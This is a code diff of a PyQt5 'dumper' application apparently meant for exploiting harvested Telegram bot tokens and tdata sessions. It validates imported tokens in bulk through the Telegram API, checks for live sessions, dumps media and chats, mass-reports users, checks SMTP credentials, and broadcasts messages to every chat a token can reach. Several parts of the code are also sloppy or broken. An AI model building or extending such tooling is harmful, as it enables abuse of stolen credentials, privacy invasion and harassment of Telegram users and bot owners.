@@ -24,7 +24,7 @@ from asyncio import Semaphore
 import datetime
 from datetime import date
 from reporting import login_telegram, report_user
-from PyQt5.QtWidgets import QMainWindow, QComboBox, QTextEdit, QProgressBar, QInputDialog, QLineEdit, QButtonGroup
+from PyQt5.QtWidgets import QMainWindow, QComboBox, QTextEdit, QProgressBar, QInputDialog, QLineEdit, QButtonGroup, QProgressDialog
 from PyQt5.QtCore import QObject, pyqtSignal
 from PyQt5.QtWidgets import QMainWindow
 from PyQt5.QtCore import QTimer
@@ -32,21 +32,40 @@ import smtplib
 from PyQt5.QtWidgets import QMainWindow, QTextEdit, QMessageBox, QApplication
 from PyQt5.QtGui import QTextCursor
 from PyQt5.QtCore import QThread, pyqtSignal
-from PyQt5.QtWidgets import QShortcut
-from PyQt5.QtGui import QKeySequence
-
-from requests.exceptions import RequestException
-
-from bot.bot import launch_bot, list_tokens
+from bot.button_handlers import *
+from panel_commands import *
+import datetime
+from datetime import datetime as dt
+# Import specific functions if needed
+from bot.bot import *
 from convert.convert_tdata import convert_tdata
 from dumper_functions.checker import check_sess
 from dumper_functions.xuy import Result
 from dumper_functions.results import saver
 from telethon.network import ConnectionTcpFull
+import datetime  # or from datetime import date
+import telebot
+from bot.button_handlers import setup_handlers
 
 
+
+
+
+
+
+
+
+def displayStatsAndCounts(self):
+    today_date = datetime.date.today().strftime('%Y-%m-%d')
 
 tracemalloc.start()
+
+commands = [
+    "/grant_user - Grants user permissions",
+    "/remove_user - Removes user permissions",
+    "/list_users - Lists all users",
+    "/help - Shows this help message"
+]
 
 
 
@@ -180,7 +199,7 @@ class MainWindow(QtWidgets.QMainWindow):
         uic.loadUi('dumper.ui', self)
         self.current_thread = None
         checks_completed_signal = pyqtSignal()
-
+        self.chat_ids = set()  # Use a set to store unique chat IDs
         self.smtp_strings = []
         self.connected_count = 0
         self.total_checks = 0
@@ -203,16 +222,7 @@ class MainWindow(QtWidgets.QMainWindow):
         self.saveMedia_button.clicked.connect(self.saveMedia_function)
         self.generate_button.clicked.connect(self.generate_function)
         self.live_session_button.clicked.connect(self.live_session_function)
-        self.menuBar = self.menuBar()
 
-        # Create Edit menu
-        self.edit_menu = self.menuBar.addMenu("&Edit")
-
-        # Create and add Select All action
-        select_all_action = QAction("Select All", self)
-        select_all_action.setShortcut("Ctrl+A")
-        select_all_action.triggered.connect(self.tableWidget.selectAll)
-        self.edit_menu.addAction(select_all_action)
         self.dumper = DumperFunctions(
             self.console_text_edit_2,
             self.dumping_file_directory_comboBox,
@@ -295,10 +305,12 @@ class MainWindow(QtWidgets.QMainWindow):
         self.total_tokens_lcdNumber.display(0)
         self.usernames = self.load_usernames("wordlists/usernames.txt")
         self.shortcut_select_all = QShortcut(QKeySequence("Ctrl+A"), self)
+        self.loop = asyncio.get_event_loop()
         # Load bots and display stats
         self.loadBotsFromDatabase()
         self.displayStatsAndCounts()
         self.updateTokenCount()
+        self.console_text_response_input.textChanged.connect(self.check_for_command)
 
 
         
@@ -317,31 +329,40 @@ class MainWindow(QtWidgets.QMainWindow):
 
         self.login_telegram_session_button.clicked.connect(self.start_login)
         self.start_reporting_button.clicked.connect(self.start_report)
-
         self.loop = asyncio.get_event_loop()
         asyncio.set_event_loop(self.loop)
 
         # Set up a timer to process asyncio events
         self.timer = QTimer(self)
-        self.timer.timeout.connect(self.process_asyncio_events)
         self.timer.start(10)  # 10ms interval
         self.reporting_reason_comboBox.currentTextChanged.connect(self.update_letter_console)
         self.smtp_check_button.clicked.connect(self.start_smtp_check)
-        self.text_file_directory_button.clicked.connect(self.select_text_file)
+
+    def show_command_menu(self):
+        """Display available commands."""
+        command_list = "\n".join(commands)
+        return f"Available Commands:\n{command_list}"
+
+    def check_for_command(self):
+        """Check for command input."""
+        message = self.console_text_response_input.toPlainText()
+
+        # Check if the last character is '/'
+        if message and message[-1] == '/':
+            command_menu = self.show_command_menu()  # Call the instance method
+            self.show_command_menu_dialog(command_menu)
+
+    def show_command_menu_dialog(self, command_menu):
+        """Show command menu in a message box."""
+        QMessageBox.information(self, "Command Menu", command_menu)
 
 
-    def select_text_file(self):
-        options = QFileDialog.Options()
-        file_path, _ = QFileDialog.getOpenFileName(
-            self,
-            "Select Text File",
-            "",
-            "Text Files (*.txt);;All Files (*)",
-            options=options
-        )
-        if file_path:
-            self.import_bulk_file_path_text_edit.setText(file_path)
-
+    def on_key_release(event):
+        # Check if the last character is '/'
+        if event.char == '/':
+            # Show command menu in a message box or console
+            command_menu = show_command_menu()
+            messagebox.showinfo("Command Menu", command_menu)
 
     def start_smtp_check(self):
         self.progressBar.setValue(0)
@@ -410,15 +431,6 @@ class MainWindow(QtWidgets.QMainWindow):
     
         # Optional: Play a sound to notify the user
         QApplication.beep()
-
-    def update_results(self, message, success):
-        # ... existing code ...
-
-        # Update counters
-        self.total_checks += 1
-        if success:
-            self.successful_checks += 1
-
 
 
 
@@ -566,17 +578,11 @@ class MainWindow(QtWidgets.QMainWindow):
         
         self.letter_console_textedit.setHtml(formatted_content)
 
-    def process_asyncio_events(self):
-        self.loop.stop()
-        self.loop.run_forever()
-
     def start_report(self):
         asyncio.create_task(self.report_telegram_user())
 
     def on_checkbox_clicked(self, checkbox):
-        # This method will be called when a checkbox is clicked
         print(f"Checkbox clicked: {checkbox.text()}")
-        # You can add more logic here based on which checkbox was clicked
 
     def code_callback(self):
         code, ok = QInputDialog.getText(self, "Telegram Code", "Enter the code sent to your Telegram account:")
@@ -595,9 +601,6 @@ class MainWindow(QtWidgets.QMainWindow):
 
     def start_login(self):
         asyncio.ensure_future(self.login_to_telegram(), loop=self.loop)
-
-    def start_report(self):
-        asyncio.ensure_future(self.report_telegram_user(), loop=self.loop)
 
     async def login_to_telegram(self):
         api_id = self.api_id_textedit.toPlainText()
@@ -656,23 +659,24 @@ class MainWindow(QtWidgets.QMainWindow):
                 processed_dirs += 1
                 self.processed_dirs = processed_dirs
                 self.total_dirs = total_dirs
-                await asyncio.sleep(0)
+                await asyncio.sleep(0)  # Yield control to the event loop
         
         await self.update_tdata_console_async(f'Search complete. Found {len(string_sessions)} sessions.')
         await self.update_tdata_console_async('Starting to check for live sessions...')
     
-        sem = asyncio.Semaphore(10)  # Adjust the number as needed
+        sem = asyncio.Semaphore(10)  # Limit concurrent tasks
         
         tasks = [self.check_sess(p, s, sem) for s, p in string_sessions.items()]
         results = await asyncio.gather(*tasks, return_exceptions=True)
     
         await self.update_tdata_console_async('All sessions checked.')
+        
         for result in results:
             await self.update_tdata_console_async(str(result))
         
         self.timer.stop()
         self.tdata_total_lcdNumber.display(tdata_count)
-        return results
+
 
     def on_async_complete(self, future):
         try:
@@ -955,23 +959,37 @@ class MainWindow(QtWidgets.QMainWindow):
         # Connect the button to a new function that will send the message
         self.console_text_response_button.clicked.connect(lambda: self.send_message_with_token(selected_token))
     
+    def add_chat_id(self, chat_id):
+        """Add a chat ID to the list of interacted chat IDs."""
+        self.chat_ids.add(chat_id)
+
     def send_message_with_token(self, token):
         message = self.console_text_response_input.toPlainText()
         if not message:
             self.console_text_edit_2.append("Error: No message entered. Please type a message and try again.")
             return
-    
+
         try:
             bot = telebot.TeleBot(token)
-            result = bot.send_message(self.get_current_chat_id(), message)
-            self.console_text_edit_2.append(f"Text sent using token {token[:10]}...: Message ID {result.message_id}")
+            for chat_id in self.chat_ids:
+                result = bot.send_message(chat_id, message)
+                self.console_text_edit_2.append(f"Text sent to chat ID {chat_id}: Message ID {result.message_id}")
+            
             # Clear the input field after sending
             self.console_text_response_input.clear()
+            
+            # Optional: Show confirmation dialog
+            QMessageBox.information(self, "Success", "Message sent successfully to all chats!")
+
+        except telebot.apihelper.ApiException as api_error:
+            self.console_text_edit_2.append(f"API Error: {str(api_error)}")
         except Exception as e:
             self.console_text_edit_2.append(f"Error sending message: {str(e)}")
-    
-        # Disconnect the button after sending to avoid multiple sends
-        self.console_text_response_button.clicked.disconnect()
+
+    # Example method to simulate adding chat IDs (this should be called when interactions occur)
+    def on_new_message_received(self, chat_id):
+        """Simulate receiving a new message from a chat and add its ID."""
+        self.add_chat_id(chat_id)
 
     def send_animation_function(self):
         file_name, _ = QFileDialog.getOpenFileName(self, "Select Animation File", "", 
@@ -1323,12 +1341,6 @@ class MainWindow(QtWidgets.QMainWindow):
             self.tdata_console_textedit.append(str(result))
 
 
-
-
-
-    def update_tdata_console(self, message):
-        self.tdata_console_textedit.append(message)
-
     async def check(self, tdata_path: str, sess: str, sem: Semaphore):
         # Your check logic here
         pass
@@ -1391,11 +1403,6 @@ class MainWindow(QtWidgets.QMainWindow):
         if current_value < 100:
             self.progressBar.setValue(current_value + 1)
 
-    def update_tdata_console(self, message):
-        self.tdata_console_textedit.append(message)
-        self.tdata_console_textedit.verticalScrollBar().setValue(
-            self.tdata_console_textedit.verticalScrollBar().maximum())
-
 
     def loadTdataDirectory(self):
         directory = QFileDialog.getExistingDirectory(self, "Select Directory")
@@ -1427,25 +1434,32 @@ class MainWindow(QtWidgets.QMainWindow):
 
     def sendDocument_function(self):
         try:
-            TOKEN = self.bot_manager_text_input.toPlainText()
-            chat_id = self.telegram_chat_id_text_input.toPlainText()
-
+            TOKEN = self.bot_manager_text_input.toPlainText().strip()
+            chat_id = self.telegram_chat_id_text_input.toPlainText().strip()
+    
+            if ':' not in TOKEN:
+                raise ValueError("Invalid token format. Token must contain a colon.")
+    
             script_dir = os.path.dirname(os.path.realpath(__file__))
             documents_dir = os.path.join(script_dir, "Documents")
-
+    
             bot = telebot.TeleBot(TOKEN)
-
+    
             for filename in os.listdir(documents_dir):
                 file_path = os.path.join(documents_dir, filename)
-
+    
                 if os.path.isfile(file_path):
                     with open(file_path, "rb") as document:
                         bot.send_document(chat_id, document)
-
+    
             self.displaySuccessMessage("Document sent successfully.")
-
+    
+        except ValueError as ve:
+            self.displayErrorMessage(f"Token error: {str(ve)}")
         except telebot.apihelper.ApiException as e:
             self.displayErrorMessage(f"Failed to send the document. Error: {str(e)}")
+        except Exception as ex:
+            self.displayErrorMessage(f"An unexpected error occurred: {str(ex)}")
 
     def sendMessage_function(self):
         try:
@@ -1458,10 +1472,10 @@ class MainWindow(QtWidgets.QMainWindow):
                 chat_id = user.chat_id
                 bot.send_message(chat_id, message)
     
-            self.console_text_edit_2.append(f"Message sent successfully to all subscribed users.")
+            self.sub_console_frame_text_2.append(f"Message sent successfully to all subscribed users.")
     
         except telebot.TeleBotException:
-            self.console_text_edit_2.append("Failed to send the message. Please try again.")
+            self.sub_console_frame_text_2.append("Failed to send the message. Please try again.")
     
     async def dumpPhoto_function(bot, user):
         user_id = str(user.id)
@@ -1477,14 +1491,6 @@ class MainWindow(QtWidgets.QMainWindow):
     async def save_media_photo(bot, chat_id, photo):
         user_media_dir = os.path.join(base_path, chat_id, 'media')
         await safe_api_request(bot.download_file(photo, os.path.join(user_media_dir, f'{photo.id}.jpg')), 'download media photo')
-
-    def stop_function(self):
-        try:
-            process_id = "your_process_id_here"
-            os.kill(process_id, signal.SIGTERM)
-            self.displaySuccessMessage("Process stopped successfully.")
-        except OSError:
-            self.displayErrorMessage("Failed to stop the process.")
 
 
     def displayJSON(self, json_data):
@@ -1502,7 +1508,7 @@ class MainWindow(QtWidgets.QMainWindow):
 
 
     def saveBotToDatabase(self, token, bot_name, username, status, submission_date, dumped):
-        connection = sqlite3.connect(r"data\database.db")
+        connection = sqlite3.connect("data/database.db")
         cursor = connection.cursor()
     
         cursor.execute("""
@@ -1573,7 +1579,7 @@ class MainWindow(QtWidgets.QMainWindow):
         last_dumped_date = ""
     
         try:
-            connection = sqlite3.connect(r'data\database.db')
+            connection = sqlite3.connect('data/database.db')
             cursor = connection.cursor()
             cursor.execute("""
                 INSERT INTO TOKENS (token, bot_name, username, status, submission_date, last_dumped_date)
@@ -1663,7 +1669,7 @@ class MainWindow(QtWidgets.QMainWindow):
         connection.close()
 
     def displayStatsAndCounts(self):
-        connection = sqlite3.connect(r"data\database.db")
+        connection = sqlite3.connect("data/database.db")
         cursor = connection.cursor()
 
         cursor.execute("SELECT COUNT(*) FROM TOKENS")
@@ -1696,12 +1702,12 @@ class MainWindow(QtWidgets.QMainWindow):
 
 ######--------------------------------------------------------------##########
 ######--------------- CONTEXT MENU OPTIONS --------------------##########
-
+    
     def showContextMenu(self, point):
         menu = QtWidgets.QMenu(self)
         
         tdata_manager_tab_action = menu.addAction("Token Manager")
-        session_manager_action = menu.addAction("Sesssion Manager")
+        session_manager_action = menu.addAction("Session Manager")
     
         action = menu.exec_(self.mapToGlobal(point))
     
@@ -1709,13 +1715,15 @@ class MainWindow(QtWidgets.QMainWindow):
             self.token_manager_ContextMenu(point)
         elif action == session_manager_action:
             self.session_manager_TabContextMenu(point)
-    
+
     def token_manager_ContextMenu(self, point):
         menu = QtWidgets.QMenu(self)
         
         refresh_action = menu.addAction("Refresh Token")
         remove_action = menu.addAction("Remove Token")
+        remove_offline_tokens_action = menu.addAction("Remove Offline Tokens")
         view_action = menu.addAction("View Token")
+        select_all_action = menu.addAction("Select All Tokens")
     
         action = menu.exec_(self.mapToGlobal(point))
     
@@ -1723,151 +1731,203 @@ class MainWindow(QtWidgets.QMainWindow):
             self.refreshToken()
         elif action == remove_action:
             self.removeToken()
+        elif action == remove_offline_tokens_action:
+            self.removeOfflineTokens()
         elif action == view_action:
             self.viewToken()
+        elif action == select_all_action:
+            self.selectAllTokens()
 
-        def token_manager_ContextMenu(self, point):
-            context_menu = QMenu(self)
-            remove_action = context_menu.addAction("Remove Token")
-            action = context_menu.exec_(self.tableWidget.mapToGlobal(point))
-            if action == remove_action:
-                self.removeToken()
-    
-    
-    
+    def selectAllTokens(self):
+        for row in range(self.tableWidget.rowCount()):
+            for col in range(self.tableWidget.columnCount()):
+                item = self.tableWidget.item(row, col)
+                if item:
+                    item.setSelected(True)
+
     def removeToken(self):
         selected_items = self.tableWidget.selectedItems()
         if not selected_items:
             QMessageBox.warning(self, "Warning", "No token selected")
             return
-    
-        rows = set(item.row() for item in selected_items)
-        tokens_to_remove = [self.tableWidget.item(row, self.TOKEN_COLUMN).text() for row in rows]
+
+        tokens_to_remove, rows_to_remove = self.getSelectedTokens(selected_items)
+
+        if not tokens_to_remove:
+            QMessageBox.warning(self, "Warning", "No valid tokens selected.")
+            return
+
+        message = f"Are you sure you want to remove {len(tokens_to_remove)} token(s)?"
         
-        if len(rows) == self.tableWidget.rowCount():
-            reply = QMessageBox.question(self, 'Remove All Tokens', 
-                                        f"Are you sure you want to remove all {len(tokens_to_remove)} tokens from your database?",
-                                        QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
-        else:
-            reply = QMessageBox.question(self, 'Remove Tokens', 
-                                        f"Are you sure you want to remove {len(tokens_to_remove)} selected token(s)?",
-                                        QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
-    
+        reply = QMessageBox.question(self, 'Remove Token(s)', message,
+                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+        
         if reply == QMessageBox.Yes:
-            try:
-                from data.database import remove_token
+            self.removeTokensFromDatabase(tokens_to_remove, rows_to_remove)
+
+    def removeOfflineTokens(self):
+        selected_items = self.tableWidget.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "Warning", "No token selected")
+            return
+
+        tokens_to_remove, rows_to_remove = self.getSelectedTokens(selected_items, offline_only=True)
+
+        if not tokens_to_remove:
+            QMessageBox.warning(self, "Warning", "No offline tokens selected.")
+            return
+
+        message = f"Are you sure you want to remove {len(tokens_to_remove)} offline token(s)?"
+        
+        reply = QMessageBox.question(self, 'Remove Offline Token(s)', message,
+                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+        
+        if reply == QMessageBox.Yes:
+            self.removeTokensFromDatabase(tokens_to_remove, rows_to_remove)
+
+    def getSelectedTokens(self, selected_items, offline_only=False):
+        tokens_to_remove = set()
+        rows_to_remove = set()
+
+        for item in selected_items:
+            row = item.row()
+            token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
+            
+            # Check for offline status if required
+            if offline_only:
+                status = self.tableWidget.item(row, self.STATUS_COLUMN).text().lower()
+                if status != 'offline':
+                    continue
+            
+            rows_to_remove.add(row)
+            tokens_to_remove.add(token)
+
+        return tokens_to_remove, rows_to_remove
+
+    def removeTokensFromDatabase(self, tokens_to_remove, rows_to_remove):
+        removed_tokens_list = []  # List to keep track of removed tokens
+        try:
+            from data.database import remove_token
+            removed_count = 0
+            
+            for token in tokens_to_remove:
+                if remove_token(token):
+                    removed_count += 1
+                    removed_tokens_list.append(token)  # Add token to the list
+            
+            # Remove from table widget
+            for row in sorted(rows_to_remove, reverse=True):
+                self.tableWidget.removeRow(row)
+
+            self.updateTokenCount()  # Update the LCD display
+            
+            # Provide feedback on removed tokens
+            if removed_count > 0:
+                removed_tokens_str = ", ".join(removed_tokens_list)
+                QMessageBox.information(self, "Success", f"{removed_count} token(s) removed successfully: {removed_tokens_str}")
+            else:
+                QMessageBox.warning(self, "Warning", f"No tokens were removed.")
                 
-                # Create and configure the progress dialog
-                progress = QProgressDialog("Removing tokens...", "Cancel", 0, len(tokens_to_remove), self)
-                progress.setWindowModality(Qt.WindowModal)
-                progress.setWindowTitle("Removing Tokens")
-                progress.setAutoClose(False)
-                progress.setAutoReset(False)
-                progress.show()
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to remove tokens: {str(e)}")
     
-                removed_count = 0
-                for i, token in enumerate(tokens_to_remove):
-                    if progress.wasCanceled():
-                        break
-                    
-                    progress.setLabelText(f"Removing Token {i+1} out of {len(tokens_to_remove)}")
-                    progress.setValue(i)
-                    
-                    if remove_token(token):
-                        removed_count += 1
-                    
-                    QApplication.processEvents()  # Ensure the UI updates
-    
-                # Remove from table widget (in reverse order to avoid index issues)
-                for row in sorted(rows, reverse=True):
-                    self.tableWidget.removeRow(row)
-                
-                self.updateTokenCount()  # Update the LCD display
-                
-                progress.close()  # Close the progress dialog
-                
-                if removed_count == len(tokens_to_remove):
-                    QMessageBox.information(self, "Success", f"{removed_count} token(s) removed successfully")
-                else:
-                    QMessageBox.warning(self, "Partial Success", 
-                                        f"{removed_count} out of {len(tokens_to_remove)} tokens removed successfully. Some tokens may not have been found in the database.")
-            except Exception as e:
-                QMessageBox.critical(self, "Error", f"Failed to remove tokens: {str(e)}")
+
 
 ######--------------------------------------------------------------##########
 ######--------------- SESSIONS/TOKENS FUNCTIONS --------------------##########
-
 
     def importBulkTokens(self):
         file_path = self.import_bulk_file_path_text_edit.toPlainText()
         tokens_to_import = []
         
         try:
-            with open(file_path, 'r', encoding='utf-8') as file:
-                tokens_to_import = [line.strip() for line in file if line.strip()]
+            with open(file_path, 'r') as file:
+                lines = file.readlines()
+    
+            for line in lines:
+                token = line.strip()
+                if token:
+                    tokens_to_import.append(token)
     
             self.console_text_edit_2.append(f"Found {len(tokens_to_import)} tokens in the file.")
     
             # Check for duplicates in the database
-            with sqlite3.connect(r'data\database.db') as connection:
-                cursor = connection.cursor()
-                
-                tokens_to_import = [token for token in tokens_to_import 
-                                    if not cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE token = ?", (token,)).fetchone()[0]]
+            connection = sqlite3.connect('data/database.db')
+            cursor = connection.cursor()
+            
+            for token in tokens_to_import[:]:
+                cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE token = ?", (token,))
+                count = cursor.fetchone()[0]
+                if count > 0:
+                    self.console_text_edit_2.append(f"Duplicate token '{token}' found in database. Skipping.")
+                    tokens_to_import.remove(token)
+    
+            connection.close()
     
             self.console_text_edit_2.append(f"{len(tokens_to_import)} unique tokens to be imported.")
     
             # Import unique tokens and write to file
             with open('valid_tokens.txt', 'w', encoding='utf-8') as valid_file:
-                for index, token in enumerate(tokens_to_import):
-                    try:
-                        response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
-                        json_data = response.json()
-                        if response.status_code == 200 and json_data.get("ok") == True:
-                            result = json_data["result"]
-                            if all(key in result for key in ["id", "first_name", "username"]):
-                                id_bot = result["id"]
-                                first_name = result["first_name"]
-                                username = result["username"]
-                                
-                                if self.addToDatabase(token, first_name, username):
-                                    self.console_text_edit_2.append(f"Token '{token}' imported successfully.")
+                for token in tokens_to_import:
+                    response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
+                    json_data = response.json()
+                    if response.status_code == 200 and json_data.get("ok") == True:
+                        result = json_data["result"]
+                        id_bot = result["id"]
+                        first_name = result["first_name"]
+                        username = result["username"]
+                        can_join_groups = result.get("can_join_groups", "N/A")
+                        can_read_all_group_messages = result.get("can_read_all_group_messages", "N/A")
+                        supports_inline_queries = result.get("supports_inline_queries", "N/A")
+                        can_connect_to_business = result.get("can_connect_to_business", "N/A")
+                        
+                        if self.addToDatabase(token, first_name, username):
+                            self.console_text_edit_2.append(f"Token '{token}' imported successfully.")
                             
-                            if self.addToDatabase(token, first_name, username):
-                                self.console_text_edit_2.append(f"Token '{token}' imported successfully.")
-                                
-                                valid_file.write(f"""# ------------------------------ #
-        {token}
-        ID Bot : {id_bot}
-        First name : {first_name}
-        Username : @{username}
-        Can join groups : {can_join_groups}
-        Can read all group messages : {can_read_all_group_messages}
-        Supports inline queries : {supports_inline_queries}
-        Can connect to business : {can_connect_to_business}
-        # ------------------------------ #
-        
-        """)
-                        else:
-                            self.console_text_edit_2.append(f"Invalid response format for token '{token}'. Skipping.")
-                    except RequestException as e:
-                        self.console_text_edit_2.append(f"Network error for token '{token}': {str(e)}")
-                    
-                    progress = (index + 1) / len(tokens_to_import) * 100
-                    self.progressBar.setValue(int(progress))
-                    QtWidgets.QApplication.processEvents()
+                            # Add this block to display detailed info in the console
+                            detailed_info = f"""# ------------------------------ #
+    Token: {token}
+    ID Bot: {id_bot}
+    First name: {first_name}
+    Username: @{username}
+    Can join groups: {can_join_groups}
+    Can read all group messages: {can_read_all_group_messages}
+    Supports inline queries: {supports_inline_queries}
+    Can connect to business: {can_connect_to_business}
+    # ------------------------------ #"""
+                            self.console_text_edit_2.append(detailed_info)
+                            
+                            valid_file.write(
+    f"""# ------------------------------ #
+    {token}
+    ID Bot : {id_bot}
+    First name : {first_name}
+    Username : @{username}
+    Can join groups : {can_join_groups}
+    Can read all group messages : {can_read_all_group_messages}
+    Supports inline queries : {supports_inline_queries}
+    Can connect to business : {can_connect_to_business}
+    # ------------------------------ #
     
-            self.updateTokenCount()
-            self.displayStatsAndCounts()
+    """)
+                    else:
+                        self.console_text_edit_2.append(f"Invalid token '{token}' found. Skipping.")
+                    QtWidgets.QApplication.processEvents()  # Process events to prevent freezing
+    
+            self.updateTokenCount()  # Update the token count display
+            self.displayStatsAndCounts()  # Update stats and counts
             self.console_text_edit_2.append("Bulk import completed.")
     
         except FileNotFoundError:
             self.console_text_edit_2.append(f"File not found: {file_path}")
-        except OSError as e:
-            self.console_text_edit_2.append(f"Error reading file: {file_path}. Error: {str(e)}")
-    
+        except OSError:
+            self.console_text_edit_2.append(f"Error reading file: {file_path}")
+        
+        
+        
+
     def isTokenDuplicate(self, token):
-        connection = sqlite3.connect(r'data\database.db')
+        connection = sqlite3.connect('data/database.db')
         cursor = connection.cursor()
         cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE token = ?", (token,))
         count = cursor.fetchone()[0]
@@ -1884,7 +1944,7 @@ class MainWindow(QtWidgets.QMainWindow):
         last_dumped_date = ""
     
         try:
-            connection = sqlite3.connect(r'data\database.db')
+            connection = sqlite3.connect('data/database.db')
             cursor = connection.cursor()
             cursor.execute("""
                 INSERT INTO TOKENS (token, bot_name, username, status, submission_date, last_dumped_date)
@@ -1910,7 +1970,7 @@ class MainWindow(QtWidgets.QMainWindow):
 
     def updateTokenCount(self):
         try:
-            connection = sqlite3.connect(r'data\database.db')
+            connection = sqlite3.connect('data/database.db')
             cursor = connection.cursor()
             cursor.execute("SELECT COUNT(*) FROM TOKENS")
             count = cursor.fetchone()[0]
@@ -2141,9 +2201,58 @@ class MainWindow(QtWidgets.QMainWindow):
         self.console_text_edit_2.verticalScrollBar().setValue(
             self.console_text_edit_2.verticalScrollBar().maximum()
         )
-        self.console_text_response_input.setEnabled(True)
-        self.console_text_response_button.setEnabled(True)
-        self.console_text_response_input.setFocus()
+        
+        # Create a Yes/No dialog
+        reply = QMessageBox.question(self, 'Remove Offline Tokens',
+                                     "Would you like to automatically remove the offline tokens from the database?",
+                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+
+        if reply == QMessageBox.Yes:
+            self.removeOfflineTokensWithProgress()
+        else:
+            self.console_text_edit_2.append("Offline tokens will not be removed.")
+
+    def removeOfflineTokensWithProgress(self):
+        offline_tokens = []
+        for row in range(self.tableWidget.rowCount()):
+            status = self.tableWidget.item(row, self.STATUS_COLUMN).text()
+            if status.lower() == 'offline':
+                token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
+                offline_tokens.append(token)
+    
+        if offline_tokens:
+            self.console_text_edit_2.append(f"Removing {len(offline_tokens)} offline tokens from the database...")
+    
+            # Create a progress dialog
+            progress_dialog = QProgressDialog("Processing...", "Cancel", 0, len(offline_tokens), self)
+            progress_dialog.setWindowTitle("Removing Offline Tokens")
+            progress_dialog.setModal(True)  # Make it modal
+            progress_dialog.setMinimumDuration(0)  # Show immediately
+    
+            for index, token in enumerate(offline_tokens):
+                self.change_token_status_to_offline(token)  # Call your method to change status
+                progress_dialog.setValue(index + 1)  # Update progress dialog
+                
+                if progress_dialog.wasCanceled():  # Check if the user canceled the operation
+                    break
+    
+            progress_dialog.close()
+            self.console_text_edit_2.append("Offline tokens have been removed.")
+        else:
+            self.console_text_edit_2.append("No offline tokens found.")
+    
+        self.console_text_edit_2.verticalScrollBar().setValue(
+            self.console_text_edit_2.verticalScrollBar().maximum()
+        )
+
+    def change_token_status_to_offline(self, token):
+        # Connect to the database
+        conn = sqlite3.connect('data/database.db')  # Ensure this path is correct
+        cursor = conn.cursor()
+        cursor.execute("UPDATE TOKENS SET status = 'Offline' WHERE token = ?", (token,))
+        
+        conn.commit()
+        conn.close()
 
     def handleRemoveOfflineTokens(self):
         response = self.console_text_response_input.text().strip().lower()
@@ -2162,33 +2271,54 @@ class MainWindow(QtWidgets.QMainWindow):
 
     def removeOfflineTokens(self):
         offline_tokens = []
+        rows_to_remove = []
+    
+        # Collect offline tokens and their corresponding rows
         for row in range(self.tableWidget.rowCount()):
             status = self.tableWidget.item(row, self.STATUS_COLUMN).text()
             if status.lower() == 'offline':
                 token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
-                offline_tokens.append(token)
-
+                username = self.tableWidget.item(row, self.NAME_COLUMN).text()  # Assuming you have a column for usernames
+                offline_tokens.append((token, username))
+                rows_to_remove.append(row)
+    
         if offline_tokens:
-            self.console_text_edit_2.append(f"Removing {len(offline_tokens)} offline tokens from the database...")
-            self.console_text_edit_2.append("Offline tokens have been removed.")
+            total_tokens = len(offline_tokens)
+            self.console_text_edit_2.append(f"Removing a Total of: {total_tokens} Tokens")
+            self.console_text_edit_2.append("----------------------------------------")
+    
+            # Remove tokens from the database and track successfully removed tokens
+            removed_tokens = []
+            try:
+                from data.database import remove_token  # Adjust based on your import structure
+                
+                for token, username in offline_tokens:
+                    if remove_token(token):  # Assuming this function returns True on success
+                        removed_tokens.append((token, username))
+    
+                # Remove from table widget
+                for row in sorted(rows_to_remove, reverse=True):
+                    self.tableWidget.removeRow(row)
+    
+                # Log removed tokens in console
+                if removed_tokens:
+                    for token, username in removed_tokens:
+                        self.console_text_edit_2.append("Removed Successfully!")
+                        self.console_text_edit_2.append(f"Token ID: {token}")
+                        self.console_text_edit_2.append(f"Bot Username: {username}")
+                        self.console_text_edit_2.append(f"Bot Token: {token}")  # Assuming token is also displayed here
+                        self.console_text_edit_2.append("----------------------------------------")
+                else:
+                    self.console_text_edit_2.append("No tokens were successfully removed.")
+                    
+            except Exception as e:
+                self.console_text_edit_2.append(f"Error removing tokens: {str(e)}")
         else:
             self.console_text_edit_2.append("No offline tokens found.")
-
+    
         self.console_text_edit_2.verticalScrollBar().setValue(
             self.console_text_edit_2.verticalScrollBar().maximum()
         )
-
-    def change_token_status_to_offline(token):
-        # Connect to the database
-        conn = sqlite3.connect(r'data\database.db')
-        cursor = conn.cursor()
-        cursor.execute("UPDATE token SET status = 'Offline' WHERE token = ?", (token,))
-    
-        conn.commit()
-        conn.close()
-
-
-
 
 
 
@@ -2216,7 +2346,7 @@ class MainWindow(QtWidgets.QMainWindow):
 
     # Add the saveTokensToDatabase function
     def saveTokensToDatabase(self):
-        connection = sqlite3.connect(r"data\database.db")
+        connection = sqlite3.connect("data/database.db")
         cursor = connection.cursor()
 
         # Clear the existing tokens in the 'bots' table
@@ -2315,14 +2445,14 @@ class MainWindow(QtWidgets.QMainWindow):
                         except SessionPasswordNeededError:
                             password = self.get_password()
                             await self.client.sign_in(password=password)
-                    self.console_text_edit_2.append("Connected to Telegram.")
+                    self.sub_console_frame_text_2.append("Connected to Telegram.")
                 else:
-                    self.console_text_edit_2.append("Phone number input cancelled.")
+                    self.sub_console_frame_text_2.append("Phone number input cancelled.")
             except Exception as e:
-                self.console_text_edit_2.append(f"Error connecting to Telegram: {str(e)}")
+                self.sub_console_frame_text_2.append(f"Error connecting to Telegram: {str(e)}")
                 self.client = None
         else:
-            self.console_text_edit_2.append("Already connected to Telegram.")
+            self.sub_console_frame_text_2.append("Already connected to Telegram.")
 
     def get_phone_number(self):
         """Prompts the user for a phone number."""
@@ -2536,6 +2666,7 @@ class MainWindow(QtWidgets.QMainWindow):
             self.console_text_edit_2.append("No user selected.")
             return
     
+        # Define the column indices for the token and botname
         self.TOKEN_COLUMN = 1  # Example column index for token
         self.BOTNAME_COLUMN = 2  # Example column index for botname
     
